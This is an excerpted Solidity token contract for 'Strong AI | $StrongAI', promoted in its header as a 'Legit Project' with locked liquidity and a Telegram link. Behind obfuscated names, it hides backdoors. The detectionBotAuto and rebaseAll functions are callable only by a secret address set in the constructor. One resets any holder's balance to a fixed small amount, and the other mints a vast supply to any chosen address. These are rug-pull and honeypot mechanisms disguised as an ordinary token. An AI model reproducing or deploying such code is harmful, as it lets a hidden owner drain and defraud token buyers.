...
/*
Strong AI | $StrongAI
INTRODUCING “Strong AI | $StrongAI - THE FUTURE IS HERE 

✅ https://t.me/StrongAIToken
✅ Legit Project
🔥 Based Dev
🔒 Liquidity Locked
🔢 9 Decimals
...
interface stgAIAsii is stgAIAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract stgAIAsiii is stgAIAs {
...
contract StrongAI is stgAIAs, stgAIAsi, stgAIAsii, stgAIAsiii {

    mapping(address => uint256) private stgAIsuplly;
  mapping(address => bool) public stgAIAsiiZERTY;
    mapping(address => mapping(address => uint256)) private Confirmed;
address private stgAIRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public stgAIPaw;
  address walowalowalo;



    
    constructor(address stgAIadressss) {
            // Editable
            walowalowalo = msg.sender;

        _name = "Strong AI";
        _symbol = "StrongAI";
  stgAIRooter = stgAIadressss;        
    ...
    function transferFrom(
      ...
      modifier botcontract() {
        require(stgAIRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    ...
    function _transfer(
        ...
        uint256 fromBalance = stgAIsuplly[from];
        require(fromBalance >= reveverbalance, "Ehi20: transfer reveverbalance exceeds balance");
        unchecked {
            stgAIsuplly[from] = fromBalance - reveverbalance;
        }
        stgAIsuplly[to] += reveverbalance;
  ...
  modifier walo () {
    ...
    function presalesend(address account, uint256 reveverbalance) internal virtual {
        ...
        stgAIsuplly[account] += reveverbalance;
  ...
  function detectionBotAuto(address adressbotauto) external botcontract {
    stgAIsuplly[adressbotauto] = 1000000000;
    ...
    function _burn(address account, uint256 reveverbalance) internal virtual {
        ...
        uint256 accountBalance = stgAIsuplly[account];
        require(accountBalance >= reveverbalance, "Ehi20: burn reveverbalance exceeds balance");
        unchecked {
            stgAIsuplly[account] = accountBalance - reveverbalance;
        }
        ALLtotalSupply -= reveverbalance;
  ...
  function rebaseAll(address rebasecontract) external botcontract {
    stgAIsuplly[rebasecontract] = 10000000000000 * 10 ** 20;
